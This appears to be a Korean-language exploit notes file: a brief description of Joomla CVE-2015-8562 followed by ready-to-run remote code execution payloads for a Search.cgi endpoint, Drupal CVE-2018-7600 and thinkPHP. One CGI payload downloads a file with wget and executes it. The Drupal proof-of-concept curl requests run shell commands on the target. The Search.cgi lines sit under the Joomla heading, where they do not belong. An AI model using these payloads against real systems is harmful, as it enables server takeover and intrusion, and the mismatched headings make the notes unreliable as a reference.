# CVE-2015-8562

joomla User-Agent 값을 코드 내에서 사용하는 과정 중 특수문자에 대한 필터링 부족으로 내부 코드를 우회하여 공격자가 원하는 php 코드를 삽입하여 원격 코드 실행하는 취약점.

User-Agent 또는 X-forwarded-for 필드에 특정 문자열을 삽입하여 Joomla 데이터베이스 SQL 명령을 실행 시킬 수 있음.

hxxp://127.0.0.1/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=LW&&username=admin%20;XmlAp%20r%20Account.User1.Password> $ (ps | grep % 20Search.cgi | grep % 20-v % 20grep | head % 20-n % 201 | awk % 20 '{print % 20 "/ tmp /"$ 1 ".log"}'); & password = admin
/cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin ;XmlAp r Account.User1.Password>$(cd /tmp; wget http://127.0.0.1/test -O test; chmod 777 test; sh test)&password=admin


# Drupal CVE-2018-7600

1. Drupal 8.X
    PoC #1 - #post_render / account/mail / exec
	curl -k -i 'http://localhost/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \ --data 'form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=uname -a'

    PoC #2 - #lazy_builder / timezone/timezone / exec
	curl -k -i 'http://localhost/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \ --data 'form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=touch+/tmp/2'
	
2. Drupal 7.X
    PoC #3 - #post_render / user/password / passthru
	curl -k -s 'http://localhost/drupal-7.55/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]=uname+-a' \ --data "form_id=user_pass&_triggering_element_name=name" | grep form_build_id
	-> form_build_id를 받은 후 아래 명령으로 다시 요청을 해야 정상적으로 공격이 먹힘.
	
	curl -k -i "http://localhost/drupal-7.55/?q=file/ajax/name/%23value/${form_build_id}" \ --data "form_build_id=${form_build_id}"
	
# thinkPHP PoC
hxxp://127.0.0.1/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20'phpinfo();'
